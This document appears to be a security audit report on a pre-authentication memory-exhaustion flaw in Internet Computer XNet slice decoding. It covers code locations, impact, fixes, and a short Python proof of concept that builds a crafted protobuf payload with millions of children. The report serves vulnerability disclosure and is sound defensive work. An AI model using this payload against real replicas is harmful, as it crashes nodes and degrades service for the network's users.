Audit Report

## Title
Pre-authentication unbounded heap allocation and O(N log N) sort via crafted XNet `CertifiedStreamSlice` payload — (`rs/state_manager/src/lib.rs`, `rs/crypto/tree_hash/src/proto.rs`)

## Summary

In `decode_certified_stream_slice`, the XNet payload is fully decoded and sorted into a `FlatMap` before the certification signature is verified. A single malicious node on a remote subnet can serve a crafted `CertifiedStreamSlice` whose `payload` encodes a `LabeledTree::SubTree` with millions of flat children, causing the receiving replica to allocate ~1–2 GB of heap and perform an O(N log N) sort before the signature check rejects the slice. The attack is repeatable and can cause sustained memory pressure or OOM on the receiving replica.

## Finding Description

In `decode_certified_stream_slice` (`rs/state_manager/src/lib.rs`), `decode_labeled_tree` is called unconditionally at line 4135, ten lines before `verify_recomputed_digest` at line 4145:

```rust
// rs/state_manager/src/lib.rs:4135
let tree = stream_encoding::decode_labeled_tree(&certified_slice.payload)?;
// ...
// rs/state_manager/src/lib.rs:4145
if !verify_recomputed_digest(...) {
    return Err(DecodeStreamError::InvalidSignature(remote_subnet));
}
```

`decode_labeled_tree` calls `v1::LabeledTree::proxy_decode` → `TryFrom<pb::LabeledTree>` → `sub_tree_map_from` (`rs/crypto/tree_hash/src/proto.rs:41–55`), which has **no child-count limit**: it collects all children into a `Vec`, then passes it to `FlatMap::from_key_values` (`rs/crypto/tree_hash/src/flat_map.rs:88–97`), which performs an O(N log N) sort if the input is unsorted. There is no `MAX_CHILDREN` guard anywhere in this path, and no payload size check before `decode_labeled_tree` is called.

The HTTP client caps the body at `5 * POOL_SLICE_BYTE_SIZE_MAX` (`rs/xnet/payload_builder/src/lib.rs:1839`). With ~7 bytes per minimal child (1-byte label + empty leaf), a 20 MB body encodes ~2.8M children. Each child materializes as a heap-allocated `Label` (`Vec<u8>`) and `LabeledTree::Leaf(Vec<u8>)`; the sort buffer, the original `Vec`, and the final `FlatMap` (two separate `Vec`s) together consume ~1–2 GB of heap — all before any authentication check.

Prost's recursion limit (depth 100) does not protect against wide/flat trees; it only limits nesting depth.

## Impact Explanation

A single malicious XNet node can repeatedly trigger ~1–2 GB of heap allocation and a multi-million-element sort on any receiving replica that fetches XNet slices from it. Under repeated fire, this causes sustained memory pressure or OOM, crashing the replica or severely degrading its performance. This matches the allowed High impact: **Application/platform-level DoS, crash, or subnet availability impact not based on raw volumetric DDoS** — severity High ($2,000–$10,000), constrained by the requirement to control a node on a remote subnet.

## Likelihood Explanation

Requires controlling one node on a remote subnet, which is below the consensus fault threshold. The XNet pool-refill task runs periodically and fetches from a single node per subnet per cycle, so a single malicious node is sufficient. The crafted payload is trivially constructable (a protobuf `LabeledTree` with a `SubTree` containing millions of minimal `Child` entries). The attack is repeatable with no rate-limiting on the decode path.

## Recommendation

1. **Move signature verification before payload decoding**: verify `certification` against the raw `payload` bytes before calling `decode_labeled_tree` in `decode_certified_stream_slice`.
2. **Add a child-count limit** in `sub_tree_map_from`: reject if `subtree.children.len()` exceeds a reasonable bound (e.g., matching the maximum number of valid stream labels).
3. **Add a payload byte-size limit** before calling `decode_labeled_tree`: reject if `payload.len() > POOL_SLICE_BYTE_SIZE_MAX`.

## Proof of Concept

```python
import struct

def encode_varint(n):
    result = []
    while n > 0x7F:
        result.append((n & 0x7F) | 0x80)
        n >>= 7
    result.append(n)
    return bytes(result)

def encode_field(field_num, wire_type, data):
    tag = (field_num << 3) | wire_type
    return encode_varint(tag) + encode_varint(len(data)) + data

# Minimal LabeledTree::Leaf (empty)
leaf_node = encode_field(1, 2, b'')

# One Child: label=b'\x00', node=leaf
child = encode_field(1, 2, b'\x00') + encode_field(2, 2, leaf_node)

# SubTree with 2_800_000 children (~20 MB)
subtree_children = child * 2_800_000
subtree = encode_field(1, 2, subtree_children)
labeled_tree = encode_field(2, 2, subtree)

# Set as CertifiedStreamSlice.payload and serve from a malicious XNet node.
# The receiving replica will allocate ~1-2 GB and sort 2.8M children
# before rejecting the slice for invalid signature.
```

Serve `labeled_tree` as the `payload` field of a `CertifiedStreamSlice` from a malicious XNet node. The receiving replica will hit `sub_tree_map_from` → `FlatMap::from_key_values` with 2.8M entries, exhausting heap memory before `verify_recomputed_digest` is ever reached.
